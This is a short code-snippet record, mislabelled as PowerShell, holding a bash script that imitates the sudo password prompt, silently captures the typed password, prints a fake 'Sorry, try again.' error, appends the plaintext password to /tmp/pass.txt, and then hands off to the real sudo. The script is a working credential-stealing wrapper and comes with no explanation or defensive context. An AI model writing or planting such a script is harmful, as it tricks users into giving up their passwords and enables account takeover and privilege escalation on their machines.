---
id: 09a4c4c6-9f35-469f-b915-ce0afeb9f563
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:17.973767+00:00'
updated_at: '2023-04-10T20:34:16.899281+00:00'
---

# Code Snippet 09a4c4c6

**Language**: Powershell

```powershell
read -sp "[sudo] password for $USER: " sudopass
echo ""
sleep 2
echo "Sorry, try again."
echo $sudopass >> /tmp/pass.txt

/usr/bin/sudo $@
```
